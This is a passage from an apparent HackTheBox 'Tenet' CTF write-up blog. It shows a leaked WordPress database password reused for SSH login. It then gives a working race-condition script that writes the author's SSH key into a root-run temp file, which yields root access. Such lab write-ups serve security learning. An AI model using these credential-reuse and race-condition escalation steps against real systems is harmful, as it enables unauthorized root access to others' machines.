</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_PASSWORD&#39;</span>, <span style=color:#e6db74>&#39;Opera2112&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL hostname */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_HOST&#39;</span>, <span style=color:#e6db74>&#39;localhost&#39;</span> );
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span></code></pre></div><p>We can re-use DB password over SSH: <code>ssh neil@tenet.htb</code>.</p><h2 id=privilege-escalation-of-machine--from-neil-to-root>Privilege Escalation of Machine : from neil to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-neil-to-root>#</a></h2><pre tabindex=0><code>$ sudo -l
Matching Defaults entries for www-data on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User www-data may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
</code></pre><p>A script can be run as root via sudo: <code>/usr/local/bin/enableSSH.sh</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>checkAdded<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        sshName<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>/bin/echo $key | /usr/bin/cut -d <span style=color:#e6db74>&#34; &#34;</span> -f 3<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> ! -z <span style=color:#66d9ef>$(</span>/bin/grep $sshName /root/.ssh/authorized_keys<span style=color:#66d9ef>)</span> <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>                /bin/echo <span style=color:#e6db74>&#34;Successfully added </span>$sshName<span style=color:#e6db74> to authorized_keys file!&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>                /bin/echo <span style=color:#e6db74>&#34;Error in adding </span>$sshName<span style=color:#e6db74> to authorized_keys file!&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>checkFile<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> ! -s $1 <span style=color:#f92672>]]</span> <span style=color:#f92672>||</span> <span style=color:#f92672>[[</span> ! -f $1 <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>                /bin/echo <span style=color:#e6db74>&#34;Error in creating key file!&#34;</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> -f $1 <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span> /bin/rm $1; <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>                exit <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>addKey<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        tmpName<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>(</span>umask 110; touch $tmpName<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        /bin/echo $key &gt;&gt;$tmpName
</span></span><span style=display:flex><span>        checkFile $tmpName
</span></span><span style=display:flex><span>        /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
</span></span><span style=display:flex><span>        /bin/rm $tmpName
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
</span></span><span style=display:flex><span>addKey
</span></span><span style=display:flex><span>checkAdded
</span></span></code></pre></div><p>Since <code>mktemp</code> will create a random file we need to make a race condition
to write our SSH pub key into it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>key<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n cyfun@penarch&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> true
</span></span><span style=display:flex><span><span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>    echo $key | tee /tmp/ssh-* &gt; /dev/null
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span></code></pre></div><p>We execute that while running <code>sudo /usr/local/bin/enableSSH.sh</code>.
Several tries may be necessary because race conditions doesn&rsquo;t always work the 1st time.</p><p>Then we can connect as root.</p><p><code>ssh root@tenet.htb -i ~/.ssh/id_ed25519</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul><nav class=paginav><a class=next href=https://s4ch.github.io/writeups/hackthebox/scriptkiddie/><span class=title>Next »</span><br><span>ScriptKiddie</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>